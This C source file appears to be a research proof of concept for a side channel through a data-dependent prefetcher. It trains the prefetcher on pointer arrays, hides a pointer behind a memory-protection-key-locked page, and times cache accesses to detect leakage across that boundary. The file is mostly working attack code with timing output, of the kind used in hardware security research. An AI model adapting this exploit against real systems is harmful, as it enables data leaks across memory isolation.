#include "../util/util.h"
#include "../EvictionLibrary/evict_lib/evict_algorithm.h"
#include "../EvictionLibrary/evict_lib/evict_set.h"
#include "../bunnyhop/bunnyhop.h"
#include <sys/mman.h>
#include <err.h>

__attribute__((noinline))
uint64_t victim_load(uint64_t* aop, uint64_t __trash) {
    __trash += aop[0]; 
    return __trash & MSB_MASK;
}

/* Prime Probe PoC */
int main(int argc, char **argv) {
    if(argc != 4) {
        printf("Usage: ./primeprobe.out <coreid> <reps> <out of bounds read idx>\n");
        exit(1);
    }

    // params
    uint64_t training_aop_size = 300;
    uint64_t core_id = atoi(argv[1]); 
    uint64_t repititions = atoi(argv[2]); 
    uint64_t out_of_bounds_idx = atoi(argv[3]); 
    int status; 

    // pin cpu
    pin_cpu(core_id);

    // output
    printf("Prime Probe PoC!\n");
    printf("Training Size: \t\t%lu\n", training_aop_size);
    printf("Core id: \t\t%lu\n", core_id);
    printf("Reps: \t\t\t%lu\n", repititions);
    printf("OoB Idx: \t\t%lu\n", out_of_bounds_idx);

    // Generate training aop + ptr_under_test
    srand(12);
    volatile uint64_t *training_aop = malloc(sizeof(uint64_t*) * training_aop_size);
    SETUP_DATA_BUFFER(training_buffer);
    for(int i = 0; i < DATA_BUFFER_MASK * U64S_PER_CACHE_LINE; i+=U64S_PER_CACHE_LINE) training_buffer[i] = rand() & (MSB_MASK - 1); 
    for(int i = 0; i < training_aop_size; i++) {
        uint64_t idx = (rand() % DATA_BUFFER_MASK) * U64S_PER_CACHE_LINE; 
        training_aop[i] = (uint64_t)&training_buffer[idx]; 
    }

    // Allocate 2 AoPs for the test buffer 
    volatile uint64_t *test_aop = mmap(NULL, 2 * getpagesize(), PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (test_aop == MAP_FAILED)
        err(EXIT_FAILURE, "mmap failed!"); 
    SETUP_DATA_BUFFER(test_buffer); // TODO change this to be protected as well 
    for(int i = 0; i < 2 * (getpagesize() / 8); i++) 
        test_aop[i] = rand() & (MSB_MASK - 1);

    // Set PKEY 
    int pkey1 = pkey_alloc(0, 0); // for first page 
    if (pkey1 == -1)
        err(EXIT_FAILURE, "pkey_alloc key1");
    int pkey2 = pkey_alloc(0, 0); // for second page 
    if (pkey2 == -1)
        err(EXIT_FAILURE, "pkey_alloc key2");

    // Set pkeys 
    status = pkey_mprotect(test_aop, getpagesize(), PROT_READ | PROT_WRITE, pkey1);
    if (status == -1)
        err(EXIT_FAILURE, "pkey_mprotect first page failed");
    status = pkey_mprotect(((uint64_t) test_aop) + getpagesize(), getpagesize(), PROT_READ | PROT_WRITE, pkey2);
    if (status == -1)
        err(EXIT_FAILURE, "pkey_mprotect second page failed");

    // Set our page to free access 
    status = pkey_set(pkey1, 0);
    if (status)
        err(EXIT_FAILURE, "pkey_set 1");

    // Generate ptr_under_test
    uint64_t *ptr_under_test = &test_buffer[(rand() % DATA_BUFFER_MASK) * U64S_PER_CACHE_LINE];

    // Generate training 
    uint64_t (*train_ddp)(uint64_t*, uint64_t, uint64_t, uint64_t) = gen_access_aop(COLLISION_FUNC_START(DEFAULT_BASE, ((uint64_t)victim_load)), 300);

    // trash
    uint64_t __trash = 0; 

    // thrash ddp state 
    sleep(0); 

    // begin loop  
    uint64_t mode = 0; 
    uint64_t base_mode = 0; 
    uint64_t base[repititions], atck[repititions];
    for(int k = 0; k < repititions * 2; k++) {

        // Open it up for us to set it
        status = pkey_set(pkey2, 0);
        if (status)
            err(EXIT_FAILURE, "pkey_set 2");
        // mprotect(((uint64_t) test_aop) + getpagesize(), getpagesize(), PROT_READ | PROT_WRITE);

        // setup target pointer
        // fprintf(stderr, "first: %p\n", &test_aop[(getpagesize() / 3) + out_of_bounds_idx]);
        test_aop[(getpagesize() / 8) + out_of_bounds_idx] = ((uint64_t)ptr_under_test & mode);

        // Disable access to it now 
        status = pkey_set(pkey2, PKEY_DISABLE_ACCESS);
        if (status)
            err(EXIT_FAILURE, "pkey_set 2");
        // mprotect(((uint64_t) test_aop) + getpagesize(), getpagesize(), PROT_READ);

        _mm_mfence(); 
        _mm_lfence();

        // flush DDP
        sleep(0);
        __trash = clflush(ptr_under_test, __trash);

        _mm_mfence(); 
        _mm_lfence();

        __trash = train_ddp((uint64_t *)training_aop, training_aop_size, __trash, 1);

        _mm_mfence(); 
        _mm_lfence();

        __trash = victim_load((uint64_t *)test_aop + ((getpagesize() / 8) - 1), __trash);

        // sleep 
        __trash = c_sleep(1500, __trash);

        // measure 
        uint64_t test_time = time_access(ptr_under_test, __trash);
        __trash = (__trash | test_time) & MSB_MASK;

        // save
        if(mode == base_mode)
            base[k/2] = test_time; 
        else 
            atck[k/2] = test_time;

        mode = ~mode;
    }

    // TODO free pkeys? 

    // output 
    // qsort( atck, repititions, sizeof(uint64_t), compare );  
    // qsort( base, repititions, sizeof(uint64_t), compare );  
    printf("Base: ");
    for(int i = 0; i < repititions; i++) printf("%lu ", base[i]);
    printf("\n");
    printf("Atck: ");
    for(int i = 0; i < repititions; i++) printf("%lu ", atck[i]);
    printf("\n");

    // calculate averages 
    uint64_t avg_base = 0, avg_atck = 0; 
    for(int i = 0; i < repititions; i++) {
        avg_base += base[i];
        avg_atck += atck[i];
    }
    avg_base /= repititions; 
    avg_atck /= repititions; 
    printf("Avg Base: \t%lu\n", avg_base);
    printf("Avg Atck: \t%lu\n", avg_atck);
    // printf("DDP Signal Detected: [%s]\n", avg_atck > avg_base ? "Yes" : "No");
}
